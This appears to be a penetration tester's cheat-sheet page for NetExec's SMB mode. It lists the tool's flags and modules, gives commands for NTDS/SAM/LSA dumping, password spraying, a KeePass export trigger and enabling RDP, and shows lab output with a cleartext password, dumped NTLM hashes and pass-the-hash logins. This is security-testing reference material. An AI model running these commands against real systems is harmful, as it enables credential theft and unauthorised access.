---
title : "SMB"
# pre : ' '
description : "Own stuff using SMB."
date : 2023-10-05T12:25:10+02:00
# hidden : true
# draft : true
weight : 0
tags : ['Framework', 'SMB']
---

## NetExec - SMB

## Installation

Install [NetExec]({{< ref "../" >}}).

## Usage

```plain
nxc smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [--ignore-pw-decoding] [-k] [--no-bruteforce] [--continue-on-success] [--use-kcache] [--log LOG]
               [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options]
               [--server {http,https}] [--server-host HOST] [--server-port PORT] [--connectback-host CHOST] [-H HASH [HASH ...]] [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE]
               [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--sam] [--lsa] [--ntds [{drsuapi,vss}]] [--dpapi [{nosystem,cookies} ...]]
               [--mkfile MKFILE] [--pvk PVK] [--enabled] [--user USERNTDS] [--shares] [--no-write-check] [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--sessions] [--disks]
               [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY]
               [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
               [--put-file FILE FILE] [--get-file FILE FILE] [--append-host] [--exec-method {wmiexec,mmcexec,atexec,smbexec}] [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC]
               [--force-ps32] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts]
               target [target ...]
```

## Flags

```plain
positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
  -k, --kerberos        Use Kerberos authentication
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2
  --continue-on-success
                        continues authentication attempts even after successes
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --log LOG             Export result into a custom file
  --aesKey AESKEY [AESKEY ...]
                        AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options
  --server {http,https}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  --connectback-host CHOST
                        IP for the remote system to connect back to (default: same as server-host)
  -H HASH [HASH ...], --hash HASH [HASH ...]
                        NTLM hash(es) or file(s) containing NTLM hashes
  -d DOMAIN             domain to authenticate to
  --local-auth          authenticate locally to each target
  --port {139,445}      SMB port (default: 445)
  --share SHARE         specify a share (default: C$)
  --smb-server-port SMB_SERVER_PORT
                        specify a server port for SMB
  --gen-relay-list OUTPUT_FILE
                        outputs all hosts that don't require SMB signing to the specified file
  --smb-timeout SMB_TIMEOUT
                        SMB connection timeout, default 2 secondes
  --laps [LAPS]         LAPS authentification

Credential Gathering:
  Options for gathering credentials

  --sam                 dump SAM hashes from target systems
  --lsa                 dump LSA secrets from target systems
  --ntds [{drsuapi,vss}]
                        dump the NTDS.dit from target DCs using the specifed method (default: drsuapi)
  --dpapi [{nosystem,cookies} ...]
                        dump DPAPI secrets from target systems, can dump cookies if you add "cookies", will not dump SYSTEM dpapi if you add nosystem

Credential Gathering:
  Options for gathering credentials

  --mkfile MKFILE       DPAPI option. File with masterkeys in form of {GUID}:SHA1
  --pvk PVK             DPAPI option. File with domain backupkey
  --enabled             Only dump enabled targets from DC
  --user USERNTDS       Dump selected user from DC

Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              enumerate shares and access
  --no-write-check      Skip write check on shares (avoid leaving traces when missing delete permissions)
  --filter-shares FILTER_SHARES [FILTER_SHARES ...]
                        Filter share by access, option 'read' 'write' or 'read,write'
  --sessions            enumerate active sessions
  --disks               enumerate disks
  --loggedon-users-filter LOGGEDON_USERS_FILTER
                        only search for specific user, works with regex
  --loggedon-users      enumerate logged on users
  --users [USER]        enumerate domain users, if a user is specified than only its information is queried.
  --groups [GROUP]      enumerate domain groups, if a group is specified than its members are enumerated
  --computers [COMPUTER]
                        enumerate computer users
  --local-groups [GROUP]
                        enumerate local groups, if a group is specified then its members are enumerated
  --pass-pol            dump password policy
  --rid-brute [MAX_RID]
                        enumerate users by bruteforcing RID's (default: 4000)
  --wmi QUERY           issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: root\cimv2)

Spidering:
  Options for spidering shares

  --spider SHARE        share to spider
  --spider-folder FOLDER
                        folder to spider (default: root share directory)
  --content             enable file content searching
  --exclude-dirs DIR_LIST
                        directories to exclude from spidering
  --pattern PATTERN [PATTERN ...]
                        pattern(s) to search for in folders, filenames and file content
  --regex REGEX [REGEX ...]
                        regex(s) to search for in folders, filenames and file content
  --depth DEPTH         max spider recursion depth (default: infinity & beyond)
  --only-files          only spider files

Files:
  Options for put and get remote files

  --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt \\Windows\\Temp\\whoami.txt
  --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
  --append-host         append the host to the get-file filename

Command Execution:
  Options for executing commands

  --exec-method {wmiexec,mmcexec,atexec,smbexec}
                        method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --dcom-timeout DCOM_TIMEOUT
                        DCOM connection timeout, default is 5 secondes
  --get-output-tries GET_OUTPUT_TRIES
                        Number of times atexec/smbexec/mmcexec tries to get results, default is 5
  --codec CODEC         Set encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec
  --force-ps32          force the PowerShell command to run in a 32-bit process
  --no-output           do not retrieve command output
  -x COMMAND            execute the specified CMD command
  -X PS_COMMAND         execute the specified PowerShell command

Powershell Obfuscation:
  Options for PowerShell script obfuscation

  --obfs                Obfuscate PowerShell scripts
  --amsi-bypass FILE    File with a custom AMSI bypass
  --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
```

### Modules

```plain
[*] add-computer              Adds or deletes a domain computer
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_av                   Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] firefox                   Dump credentials from Firefox
[*] get_netconnections        Uses WMI to query network connections.
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] iis                       Checks for credentials in IIS Application Pool configuration files using appcmd.exe
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] ioxidresolver             This module helps you to identify hosts that have additional active interfaces
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] ms17-010                  MS17-010, /!\ not tested oustide home lab
[*] msol                      Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntdsutil                  Dump NTDS with ntdsutil
[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to 0 or 1
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] pi                        Run command as logged on users via Process Injection
[*] printnightmare            Check if host vulnerable to printnightmare
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] rdcman                    Remotely dump Remote Desktop Connection Manager (sysinternals) credentials
[*] rdp                       Enables/Disables RDP
[*] reg-query                 Performs a registry query on the machine
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files recursively (excluding `EXCLUDE_FILTER` and `EXCLUDE_EXTS` extensions) and save JSON share-file metadata to the `OUTPUT_FOLDER`. If `DOWNLOAD_FLAG`=True, download files smaller then `MAX_FILE_SIZE` to the `OUTPUT_FOLDER`.
[*] spooler                   Detect if print spooler is enabled or not
[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
[*] test_connection           Pings a host
[*] uac                       Checks UAC status
[*] veeam                     Extracts credentials from local Veeam SQL Database
[*] wcc                       Check various security configuration items on Windows machines
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] webdav                    Checks whether the WebClient service is running on the target
[*] wifi                      Get key of all wireless interfaces
[*] winscp                    Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```

## Commands to Have on Hand

For local authentication, add the `--local-auth` flag to the command.

### NTDS/SAM/LSA

#### Complete Dump

```plain
nxc smb <target> -u <user> -p <password> --ntds
```

#### Dump Specific User

```plain
nxc smb <target> -u <user> -p <password> --ntds --user <username-to-dump>
```

#### Dump SAM

```plain
nxc smb <target> -u <user> -p <password> --sam
```

#### Dump LSA

```plain
nxc smb <target> -u <user> -p <password> --lsa
```

### Domain Password Spray

To find valid usernames to spray, have a look at [Kerbrute]({{< ref "kerbrute" >}}).

By default CME will stop when a valid login combination is found. If you want CME to proceed with the whole list you're trying, use the `--continue-on-success` flag.

```plain
nxc smb <dc-ip> -u <user.txt> -p <password.txt>
```

### Dump KeePass

```plain
nxc smb <target> -u <user-or-admin> -p <password> -M keepass_discover
```

```plain
nxc smb <target> -u <user-or-admin> -p <password> -M keepass_trigger -o KEEPASS_CONFIG_PATH="C:\Users\crypt0rr\AppData\Roaming\KeePass\KeePass.config.xml" ACTION=ALL
```

### Check Password Policy

```plain
nxc smb <dc-ip> -u <user> -p <password> --pass-pol
```

### Enable/disable RDP

ACTION can be set to `enable` or `disable`.

```plain
nxc smb <target> -u <user> -p <password> -M rdp -o ACTION='enable'
```

### Enumerate shares

```plain
nxc smb <target> -u <user> -p <password> --shares
```

## Practical Examples

### Checking Targets

```plain
$ nxc smb targets                                                                                              
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Generate Targets List Where Signing is Not Required

```plain
$ nxc smb targets --gen-relay-list myrelaylist
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

$ cat myrelaylist                                                                                              
100.97.176.89
100.88.252.136
```

### Check Targets for Ability to Log In, and Check Local Admin

When '(Pwn3d!)' is shown, the user is 'local admin' on the target machine.

```plain
$ nxc smb targets -u crypt0rr -p Welkom1234
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [+] offsec.nl\crypt0rr:Welkom1234 
SMB         100.108.80.137  445    DC02             [+] offsec.nl\crypt0rr:Welkom1234 
SMB         100.88.252.136  445    CL02             [+] offsec.nl\crypt0rr:Welkom1234 (Pwn3d!)
SMB         100.97.176.89   445    CL01             [+] offsec.nl\crypt0rr:Welkom1234 
Running nxc against 4 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Dump NTDS (remote)

```plain
$ nxc smb 100.120.137.43 -u administrator -p Welkom1234 --ntds            
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [+] offsec.nl\administrator:Welkom1234 (Pwn3d!)
SMB         100.120.137.43  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         100.120.137.43  445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
SMB         100.120.137.43  445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         100.120.137.43  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fcf361727013e98e5801e3f77e26ca42:::
SMB         100.120.137.43  445    DC01             offsec.nl\JANETTE_FRANCIS:1104:aad3b435b51404eeaad3b435b51404ee:c25a38cdb481cc04df93174da705e4c3:::
SMB         100.120.137.43  445    DC01             offsec.nl\JEFFEREY_MCBRIDE:1105:aad3b435b51404eeaad3b435b51404ee:49313f0112933faba1eb330ba6cf264c:::
SMB         100.120.137.43  445    DC01             offsec.nl\ROBBY_POTTER:1106:aad3b435b51404eeaad3b435b51404ee:7ef9cac31ce263d3e331366999981d47:::
SMB         100.120.137.43  445    DC01             offsec.nl\DORTHY_KERR:1107:aad3b435b51404eeaad3b435b51404ee:84f41fe1b396502031bc214faa95d04e:::
```

### Pass-the-Hash

```plain
$ nxc smb targets -u administrator -H 97f2592347d8fbe42be381726ff9ea83             
SMB         100.108.80.137  445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.88.252.136  445    CL02             [*] Windows 10.0 Build 22621 x64 (name:CL02) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.120.137.43  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         100.108.80.137  445    DC02             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         100.97.176.89   445    CL01             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         100.88.252.136  445    CL02             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         100.120.137.43  445    DC01             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
```

### Remote User Account Control (UAC)

If you know the user has local administrator rights but you get the error `STATUS_LOGON_TYPE_NOT_GRANTED` or the authentication works but not `Pwn3d!`, Remote User Account Control is likely to be enabled.

Have a look at [Regedit - Disabled Remote UAC]({{< ref "regedit#disable-remote-user-account-control-uac" >}})

```plain
$ nxc smb 100.97.176.89 -u crypt0rr -p Welkom1234  --local-auth
SMB         100.97.176.89   445    CL01             [*] Windows 10.0 Build 19041 x64 (name:CL01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         100.97.176.89   445    CL01             [-] offsec.nl\crypt0rr:Welkom1234 STATUS_LOGON_TYPE_NOT_GRANTED
```
